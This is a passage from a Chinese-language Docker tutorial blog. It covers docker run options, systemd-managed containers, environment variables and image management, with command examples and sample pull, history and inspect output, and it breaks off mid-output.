<h4 id="传递运行命令"><a href="#传递运行命令" class="headerlink" title="传递运行命令"></a>传递运行命令</h4><p>当<code>docker run xxx</code>启动容器，如果 xxx 容器中没有常驻前台的进程，xxx 会认为没什么任务，在启动后马上退出，有的服务支持前台运行，有的不支持，如果服务不支持前台运行，我们可以启动一个常驻前台的进程，阻止容器推出，常用的方式是让容器运行<code>tail -f /etc/hosts</code>命令，注意不要监听频繁更改的文件，避免产生不必要的磁盘 IO</p>
<p>范例：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># nginx前台运行，直接后台启动即可</span>
<span class="token function">docker</span> container run <span class="token parameter variable">-d</span> nginx:1120
<span class="token comment"># alpine没有常驻前台的进程，以下两种方式均可</span>
<span class="token comment"># 在容器内执行`/bin/sh`，然后把容器放到宿主机后台，sh是交互式命令，所以也有常驻前台的效果</span>
<span class="token function">docker</span> container run <span class="token parameter variable">-itd</span> alpine
<span class="token function">docker</span> run <span class="token parameter variable">-d</span> alpine <span class="token string">'tail -f /etc/hosts'</span></code></pre>

<h4 id="指定容器-DNS"><a href="#指定容器-DNS" class="headerlink" title="指定容器 DNS"></a>指定容器 DNS</h4><p>默认采用宿主机的 dns 地址，可以在 run 启动容器时指定</p>
<p>范例：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@Z510:~<span class="token comment"># docker container run -it --dns 1.1.1.1 --dns 8.8.8.8 alpine:1119</span>
/ <span class="token comment"># cat /etc/resolv.conf</span>
search magedu.com
nameserver <span class="token number">1.1</span>.1.1
nameserver <span class="token number">8.8</span>.8.8</code></pre>

<h4 id="容器内和宿主机之间复制文件-cp"><a href="#容器内和宿主机之间复制文件-cp" class="headerlink" title="容器内和宿主机之间复制文件 cp"></a>容器内和宿主机之间复制文件 cp</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># docker container cp --help</span>
Usage:	<span class="token function">docker</span> container <span class="token function">cp</span> <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span> CONTAINER:SRC_PATH DEST_PATH
		<span class="token function">docker</span> container <span class="token function">cp</span> <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span> SRC_PATH CONTAINER:DEST_PATH

Options:
  -a, <span class="token parameter variable">--archive</span>       Archive mode <span class="token punctuation">(</span>copy all uid/gid information<span class="token punctuation">)</span>
  -L, --follow-link   Always follow symbol <span class="token function">link</span> <span class="token keyword">in</span> SRC_PATH</code></pre>

<h4 id="使用-systemd-控制容器运行"><a href="#使用-systemd-控制容器运行" class="headerlink" title="使用 systemd 控制容器运行"></a>使用 systemd 控制容器运行</h4><p>范例：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># /lib/systemd/system/hello.service</span>
<span class="token punctuation">[</span>Unit<span class="token punctuation">]</span>
<span class="token assign-left variable">Description</span><span class="token operator">=</span>Hello World
<span class="token assign-left variable">After</span><span class="token operator">=</span>docker.service
<span class="token assign-left variable">Requires</span><span class="token operator">=</span>docker.service
<span class="token punctuation">[</span>Service<span class="token punctuation">]</span>
<span class="token assign-left variable">TimeoutStartSec</span><span class="token operator">=</span><span class="token number">0</span>
<span class="token assign-left variable">ExecStartPre</span><span class="token operator">=</span>-/usr/bin/docker <span class="token function">kill</span> busybox-hello
<span class="token assign-left variable">ExecStartPre</span><span class="token operator">=</span>-/usr/bin/docker <span class="token function">rm</span> busybox-hello
<span class="token assign-left variable">ExecStartPre</span><span class="token operator">=</span>/usr/bin/docker pull busybox
<span class="token assign-left variable">ExecStart</span><span class="token operator">=</span>/usr/bin/docker run <span class="token parameter variable">--name</span> busybox-hello busybox /bin/sh <span class="token parameter variable">-c</span> <span class="token string">"while true; do echo Hello World; sleep 1; done"</span>
<span class="token assign-left variable">ExecStop</span><span class="token operator">=</span>/usr/bin/docker <span class="token function">kill</span> busybox-hello
<span class="token punctuation">[</span>Install<span class="token punctuation">]</span>
<span class="token assign-left variable">WantedBy</span><span class="token operator">=</span>multi-user.target</code></pre>

<h4 id="传递环境变量"><a href="#传递环境变量" class="headerlink" title="传递环境变量"></a>传递环境变量</h4><p><code>docker container -e</code> 和 <code>docker container --env-file</code></p>
<p>范例：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> run <span class="token punctuation">\</span>
	<span class="token parameter variable">-d</span> <span class="token punctuation">\</span>
    <span class="token parameter variable">--name</span> mysql-test1 <span class="token punctuation">\</span>
    <span class="token parameter variable">-v</span> /data/mysql:/var/lib/mysql <span class="token punctuation">\</span>
    <span class="token parameter variable">-p</span> <span class="token number">3306</span>:3306 <span class="token punctuation">\</span>
    <span class="token parameter variable">-e</span> <span class="token assign-left variable">MYSQL_ROOT_PASSWORD</span><span class="token operator">=</span><span class="token number">123456</span> <span class="token punctuation">\</span>
    <span class="token parameter variable">-e</span> <span class="token assign-left variable">MYSQL_DATABASE</span><span class="token operator">=</span>wordpress <span class="token punctuation">\</span>
    <span class="token parameter variable">-e</span> <span class="token assign-left variable">MYSQL_USER</span><span class="token operator">=</span>wpuser <span class="token punctuation">\</span>
    <span class="token parameter variable">-e</span> <span class="token assign-left variable">MYSQL_PASSWORD</span><span class="token operator">=</span><span class="token number">123456</span> <span class="token punctuation">\</span>
    mysql:5.7.30

<span class="token comment"># 或</span>
<span class="token function">docker</span> run <span class="token punctuation">\</span>
    <span class="token parameter variable">-d</span> <span class="token punctuation">\</span>
    <span class="token parameter variable">--name</span> mysql-test2 <span class="token punctuation">\</span>
    <span class="token parameter variable">-v</span> /root/mysql/:/etc/mysql/conf.d <span class="token punctuation">\</span>
    <span class="token parameter variable">-v</span> /data/mysql2:/var/lib/mysql <span class="token punctuation">\</span>
    <span class="token parameter variable">-p</span> <span class="token number">3307</span>:3306 <span class="token punctuation">\</span>
    --env-file<span class="token operator">=</span>env.list <span class="token punctuation">\</span>
    mysql:5.7.30

<span class="token function">cat</span> env.list
<span class="token assign-left variable">MYSQL_ROOT_PASSWORD</span><span class="token operator">=</span><span class="token number">123456</span>
<span class="token assign-left variable">MYSQL_DATABASE</span><span class="token operator">=</span>wordpress
<span class="token assign-left variable">MYSQL_USER</span><span class="token operator">=</span>wpuser
<span class="token assign-left variable">MYSQL_PASSWORD</span><span class="token operator">=</span>wppass</code></pre>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block ljk-index-post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://blog.lujinkai.cn/%E8%BF%90%E7%BB%B4/Docker/1.2.docker%E9%95%9C%E5%83%8F%E7%AE%A1%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="//img.to2b.cn/blog/ljk/1607154764582.png">
      <meta itemprop="name" content="像方便面一样的男子">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="LJKのBlog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | LJKのBlog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/%E8%BF%90%E7%BB%B4/Docker/1.2.docker%E9%95%9C%E5%83%8F%E7%AE%A1%E7%90%86/" class="post-title-link" itemprop="url">docker镜像管理</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-01-08 11:27:17" itemprop="dateCreated datePublished" datetime="2021-01-08T11:27:17+08:00">2021-01-08</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-05-29 16:58:05" itemprop="dateModified" datetime="2023-05-29T16:58:05+08:00">2023-05-29</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/" itemprop="url" rel="index"><span itemprop="name">运维</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/Docker/" itemprop="url" rel="index"><span itemprop="name">Docker</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="镜像结构和原理"><a href="#镜像结构和原理" class="headerlink" title="镜像结构和原理"></a>镜像结构和原理</h3><p><img data-src="//img.to2b.cn/blog/ljk/1605682923317.png"></p>
<p>镜像就是创建容器的模板，含有启动容器所需要的文件系统及所需要的内容，因此镜像主要用于方便和快速的创建并启动容器</p>
<p>镜像理由是一层一层的文件系统：Union FS（联合文件系统），可以将几层目录挂载到一起（类似俄罗斯套娃），形成一个虚拟文件系统，虚拟文件系统的目录结构就像普通 linux 目录结构一样，镜像通过这些文件，再加上宿主机的内核共同构成了一个 linux 的虚拟环境，每一层文件系统叫做一层 layer，联合文件系统可以对每一层文件系统设置三种权限：readonly、readwrite、writeout-able。但是镜像中每一层文件系统都是只读的，构建镜像的时候，从一个最基本的操作系统开始，每个构建提交的操作都相当与做一层的修改，增加了一层文件系统，一层层往上叠加，上层的修改会覆盖底层该位置的可见性，当使用镜像的时候，我们只会看见一个整体，并不知道里面有几层，实际上也不需要知道</p>
<p><img data-src="//img.to2b.cn/blog/ljk/1605708696833.png"></p>
<p>一个典型的 Linux 文件系统由 bootfs 和 rootfs 两部分组成</p>
<p>bootfs（boot file system）主要包含 bootloader 和 kernel，bootloader 主要用于引导加载 kernel。系统刚启动时会加载 bootfs 文件系统，kernel 加载到内存后，接管系统的控制权，bootfs 就会被 umount 掉</p>
<p>rootfs（root file system）就是我们看到的&#x2F;dev、&#x2F;proc、&#x2F;bin、&#x2F;etc 等目录和文件，不同的 linux 发行版本（如 ubuntu 和 centos）主要在 rootfs 这一层会有所区别</p>
<p>一般的镜像通常都比较小，镜像直接调用宿主机的内核，镜像中只提供 rootfs，也就是只需包括最基本的命令、配置文件和程序库等相关文件就可以了</p>
<h4 id="容器、镜像和父镜像关系："><a href="#容器、镜像和父镜像关系：" class="headerlink" title="容器、镜像和父镜像关系："></a>容器、镜像和父镜像关系：</h4><p><img data-src="//img.to2b.cn/blog/ljk/1605708732600.png"></p>
<h3 id="alpine-介绍"><a href="#alpine-介绍" class="headerlink" title="alpine 介绍"></a>alpine 介绍</h3><p>Alpine 操作系统是一个面向安全的轻型 Linux 发行版。它不同于通常 Linux 发行版,Alpine 采用了 musl libc 和 busybox 以减小系统的体积和运行时资源消耗，但功能上比 busybox 又完善的多，因此得到开源社区越来越多的青睐。在保持瘦身的同时，Alpine 还提供了自己的包管理工具 apk，可以通过<a target="_blank" rel="noopener" href="https://pkgs.alpinelinux.org/packages">https://pkgs.alpinelinux.org/packages</a> 网站上查询包信息，也可以直接通过 apk 命令直接查询和安装各种软件。</p>
<p>Alpine 由非商业组织维护的，支持广泛场景的 Linux 发行版，它特别为资深&#x2F;重度 Linux 用户而优化，关注安全，性能和资源效能。Alpine 镜像可以适用于更多常用场景，并且是一个优秀的可以适用于生产的基础系统&#x2F;环境。</p>
<p>Alpine Docker 镜像也继承了 Alpine Linux 发行版的这些优势。相比于其他 Docker 镜像，它的容量非常小，仅仅只有 5 MB 左右(对比 Ubuntu 系列镜像接近 200 MB)，且拥有非常友好的包管理机制。官方镜像来自 docker-alpine 项目。</p>
<p>目前 Docker 官方已开始推荐使用 Alpine 替代之前的 Ubuntu 做为基础镜像环境。这样会带来多个好处。包括镜像下载速度加快，镜像安全性提高，主机之间的切换更方便，占用更少磁盘空间等。</p>
<ul>
<li>Alpine 官网: <a target="_blank" rel="noopener" href="https://www.alpinelinux.org/">https://www.alpinelinux.org/</a></li>
<li>Alpine 官方仓库: <a target="_blank" rel="noopener" href="https://github.com/alpinelinux">https://github.com/alpinelinux</a></li>
<li>Alpine 官方镜像: <a target="_blank" rel="noopener" href="https://hub.docker.com/_/alpine/">https://hub.docker.com/_/alpine/</a></li>
<li>Alpine 官方镜像仓库: <a target="_blank" rel="noopener" href="https://github.com/gliderlabs/docker-alpine">https://github.com/gliderlabs/docker-alpine</a></li>
<li>Alpine 阿里云的镜像仓库: <a target="_blank" rel="noopener" href="https://mirrors.aliyun.com/alpine/">https://mirrors.aliyun.com/alpine/</a></li>
</ul>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#修改源替换成阿里源：将/etc/apk/repositories中的 dl-cdn.alpinelinux.org 改成 mirrors.aliyun.com</span>
<span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s/dl-cdn.alpinelinux.org/mirrors.aliyun.com/'</span> /etc/apk/repositories
<span class="token comment">#更新源</span>
apk update
<span class="token comment"># 查找可用软件包</span>
apk search <span class="token punctuation">[</span>vim<span class="token punctuation">]</span>
<span class="token comment"># 列出软件信息</span>
apk info <span class="token punctuation">[</span>vim<span class="token punctuation">]</span>
<span class="token comment">#安装软件</span>
apk <span class="token function">add</span> <span class="token function">vim</span>
<span class="token comment">#删除软件</span>
apk del openssh openntp <span class="token function">vim</span></code></pre>

<h3 id="搜索镜像"><a href="#搜索镜像" class="headerlink" title="搜索镜像"></a>搜索镜像</h3><ul>
<li>官方网站进行镜像的搜索：<a target="_blank" rel="noopener" href="http://hub.docker.com/">http://hub.docker.com</a></li>
<li>执行<code>docker search</code>命令进行搜索</li>
</ul>
<p>如果联网下载，一般不会使用命令搜索，而是去官网搜索</p>
<h3 id="docker-镜像加速"><a href="#docker-镜像加速" class="headerlink" title="docker 镜像加速"></a>docker 镜像加速</h3><p>登录阿里云 –&gt; 容器镜像服务 –&gt; 镜像中心 –&gt; 镜像加速器</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /etc/docker
<span class="token function">sudo</span> <span class="token function">tee</span> /etc/docker/daemon.json <span class="token operator">&lt;&lt;-</span><span class="token string">'EOF'
&#123;
  "registry-mirrors": ["https://3417nt4m.mirror.aliyuncs.com"]
&#125;
EOF</span>
<span class="token function">sudo</span> systemctl daemon-reload
<span class="token function">sudo</span> systemctl restart <span class="token function">docker</span></code></pre>

<h3 id="docker-image"><a href="#docker-image" class="headerlink" title="docker image"></a><code>docker image</code></h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># docker help image</span>
Usage:	<span class="token function">docker</span> image COMMAND

Commands:
  build       <span class="token comment"># 从Dockerfile中构建镜像</span>
  <span class="token function">history</span>     <span class="token comment"># 显示镜像分层历史</span>
  <span class="token function">import</span>      <span class="token comment"># 从tar包中的内容创建一个新的文件系统映像[对应 container export]</span>
  inspect     <span class="token comment"># 显示容器详细信息</span>
  load        <span class="token comment"># 从一个tar包中加载一个镜像[对应save]</span>
  <span class="token function">ls</span>          List images
  prune       <span class="token comment"># 移除未使用的镜像</span>
  pull        Pull an image or a repository from a registry
  push        Push an image or a repository to a registry
  <span class="token function">rm</span>          <span class="token comment"># 移除一个或多个镜像</span>
  save        <span class="token comment"># 保存一个镜像为一个tar包[对应load]</span>
  tag         Create a tag TARGET_IMAGE that refers to SOURCE_IMAGE</code></pre>

<h4 id="下载镜像-pull"><a href="#下载镜像-pull" class="headerlink" title="下载镜像 pull"></a>下载镜像 <code>pull</code></h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># docker help pull</span>
<span class="token function">docker</span> pull <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span> NAME<span class="token punctuation">[</span>:TAG<span class="token operator">|</span>@DIGEST<span class="token punctuation">]</span>

Options:
  -a, 	--all-tags                	Download all tagged images <span class="token keyword">in</span> the repository
  		--disable-content-trust   	Skip image verification <span class="token punctuation">(</span>default <span class="token boolean">true</span><span class="token punctuation">)</span>
  		<span class="token parameter variable">--platform</span> string         	Set platform <span class="token keyword">if</span> server is multi-platform capable
  -q, 	<span class="token parameter variable">--quiet</span>                   	Suppress verbose output

NAME		镜像名，仓库服务器:端口/项目名称/镜像名称
:TAG		版本号,如果不指定:TAG,则下载最新版镜像
@DIGEST		摘要</code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@ubuntu1804 ~<span class="token punctuation">]</span><span class="token comment">#docker pull hello-world</span>
Using default tag: latest						<span class="token comment"># tag 默认下载tag为latest</span>
latest: Pulling from library/hello-world
1b930d010525: Pull complete						<span class="token comment"># 分层下载</span>
Digest: sha256:9572f7cdcee8591948c2963463447a53466950b3fc15a247fcad1917ca215a2f		<span class="token comment"># 摘要</span>
Status: Downloaded newer image <span class="token keyword">for</span> hello-world:latest
docker.io/library/hello-world:latest			<span class="token comment"># 下载的完整地址</span></code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">docker</span> pull nginx:stable-alpine
stable-alpine: Pulling from library/nginx
97518928ae5f: Pull complete
a15dfa83ed30: Pull complete
acae0b19bbc1: Pull complete
fd4282442678: Pull complete
b521ea0d9e3f: Pull complete
b3282d03aa58: Pull complete
Digest: sha256:74694f2de64c44787a81f0554aa45b281e468c0c58b8665fafceda624d31e556
Status: Downloaded newer image <span class="token keyword">for</span> nginx:stable-alpine
docker.io/library/nginx:stable-alpine</code></pre>

<p>下载后的镜像位于：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">/var/lib/docker/overlay2/镜像ID</code></pre>

<h4 id="查看镜像分层历史-history"><a href="#查看镜像分层历史-history" class="headerlink" title="查看镜像分层历史 history"></a>查看镜像分层历史 <code>history</code></h4><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">docker</span> image <span class="token function">history</span> nginx:latest
IMAGE          CREATED         CREATED BY                                      SIZE      COMMENT
605c77e624dd   <span class="token number">11</span> months ago   /bin/sh <span class="token parameter variable">-c</span> <span class="token comment">#(nop)  CMD ["nginx" "-g" "daemon…   0B</span>
<span class="token operator">&lt;</span>missing<span class="token operator">></span>      <span class="token number">11</span> months ago   /bin/sh <span class="token parameter variable">-c</span> <span class="token comment">#(nop)  STOPSIGNAL SIGQUIT           0B</span>
<span class="token operator">&lt;</span>missing<span class="token operator">></span>      <span class="token number">11</span> months ago   /bin/sh <span class="token parameter variable">-c</span> <span class="token comment">#(nop)  EXPOSE 80                    0B</span>
<span class="token operator">&lt;</span>missing<span class="token operator">></span>      <span class="token number">11</span> months ago   /bin/sh <span class="token parameter variable">-c</span> <span class="token comment">#(nop)  ENTRYPOINT ["/docker-entr…   0B</span>
<span class="token operator">&lt;</span>missing<span class="token operator">></span>      <span class="token number">11</span> months ago   /bin/sh <span class="token parameter variable">-c</span> <span class="token comment">#(nop) COPY file:09a214a3e07c919a…   4.61kB</span>
<span class="token operator">&lt;</span>missing<span class="token operator">></span>      <span class="token number">11</span> months ago   /bin/sh <span class="token parameter variable">-c</span> <span class="token comment">#(nop) COPY file:0fd5fca330dcd6a7…   1.04kB</span>
<span class="token operator">&lt;</span>missing<span class="token operator">></span>      <span class="token number">11</span> months ago   /bin/sh <span class="token parameter variable">-c</span> <span class="token comment">#(nop) COPY file:0b866ff3fc1ef5b0…   1.96kB</span>
<span class="token operator">&lt;</span>missing<span class="token operator">></span>      <span class="token number">11</span> months ago   /bin/sh <span class="token parameter variable">-c</span> <span class="token comment">#(nop) COPY file:65504f71f5855ca0…   1.2kB</span>
<span class="token operator">&lt;</span>missing<span class="token operator">></span>      <span class="token number">11</span> months ago   /bin/sh <span class="token parameter variable">-c</span> <span class="token builtin class-name">set</span> <span class="token parameter variable">-x</span>     <span class="token operator">&amp;&amp;</span> addgroup <span class="token parameter variable">--system</span> -…   <span class="token number">61</span>.1MB
<span class="token operator">&lt;</span>missing<span class="token operator">></span>      <span class="token number">11</span> months ago   /bin/sh <span class="token parameter variable">-c</span> <span class="token comment">#(nop)  ENV PKG_RELEASE=1~bullseye   0B</span>
<span class="token operator">&lt;</span>missing<span class="token operator">></span>      <span class="token number">11</span> months ago   /bin/sh <span class="token parameter variable">-c</span> <span class="token comment">#(nop)  ENV NJS_VERSION=0.7.1        0B</span>
<span class="token operator">&lt;</span>missing<span class="token operator">></span>      <span class="token number">11</span> months ago   /bin/sh <span class="token parameter variable">-c</span> <span class="token comment">#(nop)  ENV NGINX_VERSION=1.21.5     0B</span>
<span class="token operator">&lt;</span>missing<span class="token operator">></span>      <span class="token number">11</span> months ago   /bin/sh <span class="token parameter variable">-c</span> <span class="token comment">#(nop)  LABEL maintainer=NGINX Do…   0B</span>
<span class="token operator">&lt;</span>missing<span class="token operator">></span>      <span class="token number">11</span> months ago   /bin/sh <span class="token parameter variable">-c</span> <span class="token comment">#(nop)  CMD ["bash"]                 0B</span>
<span class="token operator">&lt;</span>missing<span class="token operator">></span>      <span class="token number">11</span> months ago   /bin/sh <span class="token parameter variable">-c</span> <span class="token comment">#(nop) ADD file:09675d11695f65c55…   80.4MB</span></code></pre>

<h4 id="查看容器详细信息-inspect"><a href="#查看容器详细信息-inspect" class="headerlink" title="查看容器详细信息 inspect"></a>查看容器详细信息 <code>inspect</code></h4><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">docker</span> image inspect nginx:latest
<span class="token punctuation">[</span>
    <span class="token punctuation">&#123;</span>
        <span class="token string">"Id"</span><span class="token builtin class-name">:</span> <span class="token string">"sha256:605c77e624ddb75e6110f997c58876baa13f8754486b461117934b24a9dc3a85"</span>,
        <span class="token string">"RepoTags"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>
            <span class="token string">"nginx:latest"</span>
        <span class="token punctuation">]</span>,
        <span class="token string">"RepoDigests"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>
            <span class="token string">"nginx@sha256:0d17b565c37bcbd895e9d92315a05c1c3c9a29f762b011a10c54a66cd53c9b31"</span>
        <span class="token punctuation">]</span>,
        <span class="token string">"Parent"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>,
        <span class="token string">"Comment"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>,
        <span class="token string">"Created"</span><span class="token builtin class-name">:</span> <span class="token string">"2021-12-29T19:28:29.892199479Z"</span>,
        <span class="token string">"Container"</span><span class="token builtin class-name">:</span> <span class="token string">"ca3e48389f7160bc9d9a892d316fcbba459344ee3679998739b1c3cd8e56f7da"</span>,
        <span class="token string">"ContainerConfig"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>
            <span class="token string">"Hostname"</span><span class="token builtin class-name">:</span> <span class="token string">"ca3e48389f71"</span>,
            <span class="token string">"Domainname"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>,
            <span class="token string">"User"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>,
            <span class="token string">"AttachStdin"</span><span class="token builtin class-name">:</span> false,
            <span class="token string">"AttachStdout"</span><span class="token builtin class-name">:</span> false,
            <span class="token string">"AttachStderr"</span><span class="token builtin class-name">:</span> false,
            <span class="token string">"ExposedPorts"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>
                <span class="token string">"80/tcp"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>,
            <span class="token string">"Tty"</span><span class="token builtin class-name">:</span> false,
            <span class="token string">"OpenStdin"</span><span class="token builtin class-name">:</span> false,
            <span class="token string">"StdinOnce"</span><span class="token builtin class-name">:</span> false,
            <span class="token string">"Env"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>
                <span class="token string">"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>,
                <span class="token string">"NGINX_VERSION=1.21.5"</span>,
                <span class="token string">"NJS_VERSION=0.7.1"</span>,
                <span class="token string">"PKG_RELEASE=1~bullseye"</span>
            <span class="token punctuation">]</span>,
            <span class="token string">"Cmd"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>
                <span class="token string">"/bin/sh"</span>,
                <span class="token string">"-c"</span>,
                <span class="token string">"#(nop) "</span>,
                <span class="token string">"CMD [<span class="token entity" title="\&quot;">\"</span>nginx<span class="token entity" title="\&quot;">\"</span> <span class="token entity" title="\&quot;">\"</span>-g<span class="token entity" title="\&quot;">\"</span> <span class="token entity" title="\&quot;">\"</span>daemon off;<span class="token entity" title="\&quot;">\"</span>]"</span>
            <span class="token punctuation">]</span>,
            <span class="token string">"Image"</span><span class="token builtin class-name">:</span> <span class="token string">"sha256:82941edee2f4d17c55563bb926387c3ae39fa1a99777f088bc9d3db885192209"</span>,
            <span class="token string">"Volumes"</span><span class="token builtin class-name">:</span> null,
            <span class="token string">"WorkingDir"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>,
            <span class="token string">"Entrypoint"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>
                <span class="token string">"/docker-entrypoint.sh"</span>
            <span class="token punctuation">]</span>,
            <span class="token string">"OnBuild"</span><span class="token builtin class-name">:</span> null,
            <span class="token string">"Labels"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>
                <span class="token string">"maintainer"</span><span class="token builtin class-name">:</span> <span class="token string">"NGINX Docker Maintainers &lt;docker-maint@nginx.com>"</span>
            <span class="token punctuation">&#125;</span>,
            <span class="token string">"StopSignal"</span><span class="token builtin class-name">:</span> <span class="token string">"SIGQUIT"</span>
        <span class="token punctuation">&#125;</span>,
        <span class="token string">"DockerVersion"</span><span class="token builtin class-name">:</span> <span class="token string">"20.10.7"</span>,
        <span class="token string">"Author"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>,
        <span class="token string">"Config"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>
            <span class="token string">"Hostname"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>,
            <span class="token string">"Domainname"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>,
            <span class="token string">"User"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>,
            <span class="token string">"AttachStdin"</span><span class="token builtin class-name">:</span> false,
            <span class="token string">"AttachStdout"</span><span class="token builtin class-name">:</span> false,
            <span class="token string">"AttachStderr"</span><span class="token builtin class-name">:</span> false,
            <span class="token string">"ExposedPorts"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>
                <span class="token string">"80/tcp"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>,
            <span class="token string">"Tty"</span><span class="token builtin class-name">:</span> false,
            <span class="token string">"OpenStdin"</span><span class="token builtin class-name">:</span> false,
            <span class="token string">"StdinOnce"</span><span class="token builtin class-name">:</span> false,
            <span class="token string">"Env"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>
                <span class="token string">"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>,
                <span class="token string">"NGINX_VERSION=1.21.5"</span>,
                <span class="token string">"NJS_VERSION=0.7.1"</span>,
                <span class="token string">"PKG_RELEASE=1~bullseye"</span>
            <span class="token punctuation">]</span>,
            <span class="token string">"Cmd"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>
                <span class="token string">"nginx"</span>,
                <span class="token string">"-g"</span>,
                <span class="token string">"daemon off;"</span>
            <span class="token punctuation">]</span>,
            <span class="token string">"Image"</span><span class="token builtin class-name">:</span> <span class="token string">"sha256:82941edee2f4d17c55563bb926387c3ae39fa1a99777f088bc9d3db885192209"</span>,
            <span class="token string">"Volumes"</span><span class="token builtin class-name">:</span> null,
            <span class="token string">"WorkingDir"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>,
            <span class="token string">"Entrypoint"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>
                <span class="token string">"/docker-entrypoint.sh"</span>
            <span class="token punctuation">]</span>,
            <span class="token string">"OnBuild"</span><span class="token builtin class-name">:</span> null,
            <span class="token string">"Labels"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>
                <span class="token string">"maintainer"</span><span class="token builtin class-name">:</span> <span class="token string">"NGINX Docker Maintainers &lt;docker-maint@nginx.com>"</span>
            <span class="token punctuation">&#125;</span>,
            <span class="token string">"StopSignal"</span><span class="token builtin class-name">:</span> <span class="token string">"SIGQUIT"</span>
        <span class="token punctuation">&#125;</span>,
        <span class="token string">"Architecture"</span><span class="token builtin class-name">:</span> <span class="token string">"amd64"</span>,
        <span class="token string">"Os"</span><span class="token builtin class-name">:</span> <span class="token string">"linux"</span>,
        <span class="token string">"Size"</span><span class="token builtin class-name">:</span> <span class="token number">141479488</span>,
        <span class="token string">"VirtualSize"</span><span class="token builtin class-name">:</span> <span class="token number">141479488</span>,
        <span class="token string">"GraphDriver"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>
            <span class="token string">"Data"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>
